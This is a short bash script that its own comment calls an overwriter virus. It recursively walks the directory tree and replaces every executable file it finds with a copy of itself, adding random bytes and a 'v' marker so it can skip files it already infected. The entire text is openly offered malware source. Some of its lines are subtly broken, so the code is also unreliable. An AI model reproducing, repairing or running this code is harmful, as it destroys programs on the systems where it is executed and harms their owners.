#!/bin/bash
# Overwriter virus with a signature 'v' and no payload.
function move_infect(){
	for file in *
	do
		# Call recursively in subdirectory
		if [ -d "$file" ]
		then
			cd "$file"
			move_infect "$1"
		fi
		
		# Infect executable file and avoid overwriting itself
		if [ -f "$file" ] && [ -x "$file" ] && [ "$file" != "$0" ]
		then
			# Avoid infect already infected file
			tmp=$(tail -c 1)
			if [ "$tmp" != "v" ]
			then
				cp "$1" "$file"
				# Avoid having the same size for each infected file
				tmp=$(head -c $(($RANDOM%10000)) /dev/urandom)
				printf "%sv"  >> "$file"
			fi
		fi
	done
}
move_infect "$PWD/${0##*/}"
